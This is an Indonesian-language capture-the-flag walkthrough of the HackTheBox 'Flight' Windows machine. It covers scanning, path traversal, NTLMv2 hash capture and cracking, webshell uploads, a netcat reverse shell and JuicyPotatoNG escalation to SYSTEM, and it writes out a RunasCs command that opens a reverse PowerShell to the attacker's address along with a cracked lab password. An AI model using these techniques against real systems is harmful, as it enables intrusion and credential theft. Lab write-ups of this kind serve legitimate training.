---
title: "HackTheBox - Flight Writeups"
date: 2023-01-09 18:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox Flight Writeups

Scanning dengan nmap. Berikut port terbuka sebagai berikut:
```
┌──(root㉿yupy)-[~/yp/hackthebox/Flight]
└─# nmap -sC -sV 10.10.11.187 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 17:43 PST
Nmap scan report for 10.10.11.187
Host is up (0.035s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-22 08:44:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-22T08:44:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.81 seconds

```

Scanning dengan Nikto untuk melihat vulnerability Assessment yang ada:
![image](https://media.discordapp.net/attachments/740245586095112242/1061907176899219497/image.png)

Fuzzing directory dengan berbagai tools Dirsearch dan Dirb:
![image](https://media.discordapp.net/attachments/740245586095112242/1061907396965969970/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061907509281050694/image.png)

Fuzzing subdomain flight.htb dengan wfuzz tools, disini kita menemukan subdomain school.
![image](https://media.discordapp.net/attachments/740245586095112242/1061907881328386048/image.png)

Kita juga menggunakan tools scanning Burp Suite, dari scan deep dari BurpSuite kami menemukan kerentanan tentang File Path Travesal yang ada pada parameter ```view:```. Disini bila menggunakan payload ```file:///c:/windows/win.ini``` yang telah kita encode urlnya. Kita bisa melihat version pada windows tersebut dengan payload ini.
![image](https://media.discordapp.net/attachments/740245586095112242/1061908290033950730/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061908563062169600/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061908581726830592/image.png)

Dari kita mencoba melihat file lokal di server, kita dapat mencoba RFI yang berpontial SSRF juga di server target, sehingga bila kita menginputkan url server kita akan mengautentikasi dan menunjukkan kepada kita hash ntlmv2 dari pengguna yang sedang berjalan, seperti di server yang merespons, disini kita menggunakan responder untuk mendapatkan responya:
![image](https://media.discordapp.net/attachments/740245586095112242/1061908805669105744/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061908924904767529/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061909236583497808/image.png)

Setelah mendapatkan hash ntmlv2 kita juga crack hash tersebut dengan tools ```John```, dan disini kita mendapatkan password:
![image](https://media.discordapp.net/attachments/740245586095112242/1061909440175030272/image.png)

Kita disini mencoba mencocokan password kredensial yang terhubung dengan smb server target tersebut, dan kita mendapatkanya bila password itu cocok dengan user ```svc_apache```
![image](https://media.discordapp.net/attachments/740245586095112242/1061909663475580978/image.png)

Kita melanjutkanya untuk melihat user lain yang ada di Smb server target. Disini kita melihat semua user yang ada pada Smb server target tersebut.
![image](https://media.discordapp.net/attachments/740245586095112242/1061909916119482378/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061909948692439090/image.png)

Setelah kami membuat file dengan user yang didapat tadi, dan disini kita mencoba mencocokan kredential lagi. Disini kita mendapatkan users dengan password yang cocok selain ```svc_apache``` yaitu ```S.Moon```.
![image](https://media.discordapp.net/attachments/740245586095112242/1061910433654652978/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061910747677999134/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061910851554127912/image.png)

```S.Moon``` menggunakannya, kita dapat mencari direktori seseorang yang memiliki izin.
![image](https://media.discordapp.net/attachments/740245586095112242/1061911187278807041/image.png)

Kita mencoba login dengan smbclient dan kita dapat masuk. Disini tidak ada file apapun namun kita mencoba memasukan payload yang saya dapatkan dari [hacktricks](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini)
![image](https://media.discordapp.net/attachments/740245586095112242/1061911597070684251/image.png)

Disini kita membuat payload yang nantinya kita akan mendapatkan Hash lagi dari response backconnect:
![image](https://media.discordapp.net/attachments/740245586095112242/1061913339787214888/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061913514706468874/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061913655819640903/image.png)

Seperti biasa untuk crack hash ntmlv2 yang di dapat dari backconnect tadi, dan mendapatkanya passwordnya.
![image](https://media.discordapp.net/attachments/740245586095112242/1061913834203398154/image.png)

Setelah kita crack passwordnya mencoba melihat directory share dengan user ```C.Bum``` dan password ```Tikkycoll_431012284```.
![image](https://media.discordapp.net/attachments/740245586095112242/1061914069633859654/image.png)

Disini kita mencoba login dengan user dan password tadi, terdapat directory flight.htb dan school.flight.htb yang berarti directory ini adalah directory yang memuat halaman page tadi.
![image](https://media.discordapp.net/attachments/740245586095112242/1061914726629642261/image.png)

Setelah itu kita mencoba mengupload webshell [wwwolf](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) yang kita gunakan backconnect nantinya.
![image](https://media.discordapp.net/attachments/740245586095112242/1061915087260102756/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061915170387005470/image.png)

Setelah berhasil kita mengupload netcat yang didapat dari github: [netcat](https://github.com/diegocr/netcat) yang kita akan upload ke dalam server. Berhasil terupload netcatnya kita backconnect an dengan netcat pc kita.
![image](https://media.discordapp.net/attachments/740245586095112242/1061915537552183296/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061915560692174918/image.png)

Disini mencoba privileges escalation pada server yang menggunakan windows ini, dengan menggunakan [RunaCS](https://github.com/antonioCoco/RunasCs/releases/tag/v1.4) ini kita dapat menjalakan command powershell lebih detail lagi.
![image](https://media.discordapp.net/attachments/740245586095112242/1061915914670456842/image.png)

Dan kita sambungkan dengan netcat yang bila nanti kita buka akan menggunakan command powershell.
```
.\RunasCs.exe C.bum Tikkycoll_431012284 powershell -r 10.10.14.7:7333
```
![image](https://media.discordapp.net/attachments/740245586095112242/1061916347669434388/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061916374814969946/image.png)

Bagaimana cara privileges escalation dengan server ini? Kita akan menemukanya, setelah kita melihat lihat isi server ini.
![image](https://media.discordapp.net/attachments/740245586095112242/1061916681754128384/image.png)

Kita disini dapat melihat isi ```user.txt``` yang berada di user ```C.Bum``` tetapi kita tidak bisa melihat isi user administrator.
![image](https://media.discordapp.net/attachments/740245586095112242/1061916983865655316/image.png)

Setelah mencari lebih dalam kita menemukan bahwa kalau kita membuka netstat dengan command ```netstat -oat``` kita akan melihat port 8000 yang berarti port ini mendapatkan isi web yang mungkin menampilkan halaman page baru.
![image](https://media.discordapp.net/attachments/740245586095112242/1061917375475236894/image.png)

Kita disini menggunakan chisel untuk melihat yang ada pada port 8000 dengan cara menghubungkan port ini kedalam server kita. Dengan mengupload chisel yang saya dapatkan dari [chisel](https://github.com/jpillora/chisel) jalankan chisel server target dan server pc kita sendiri.
![image](https://media.discordapp.net/attachments/740245586095112242/1061917823154262087/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061917995175247882/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061918031158194206/image.png)

Disini bila kita membuka port 8000 dengan localhost akan memunculkan tampilan seperti gambar dibawah.
![image](https://media.discordapp.net/attachments/740245586095112242/1061919532517691412/image.png)

Mencari dimana letak source code halaman page ini, dan kita menemukanya letak source code port 8000 di directory ```C:\inetpub\development```
![image](https://media.discordapp.net/attachments/740245586095112242/1061919749308678234/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061919774847807488/image.png)

Selanjutnya kita mencoba upload shell [cmd](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) yang saya punyai.
![image](https://media.discordapp.net/attachments/740245586095112242/1061920219062345758/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061920412969205770/image.png)

Kita mencoba backconnect an lagi dengan netcat. Disini kami melakukan pencarian yang bisa untuk mendapatkan user Administrator secara langsung.
![image](https://media.discordapp.net/attachments/740245586095112242/1061920601549312080/image.png)

Dengan menambahkan command whoami ```/priv``` kita dapat melihat bahwa memungkinkan privileges escalation. [Referensi](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)
![image](https://media.discordapp.net/attachments/740245586095112242/1061920971969282080/image.png)

Disini kita menggunakan [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) untuk menaikan user biasa ke user administrator. Dengan command dibawah kita bisa mendapatkan ```nt authority\system``` yang dapat melakukan eksekusi apapun yang terdapat di server.
![image](https://media.discordapp.net/attachments/740245586095112242/1061921580151742464/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061926134536753172/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1061921783680348201/image.png)
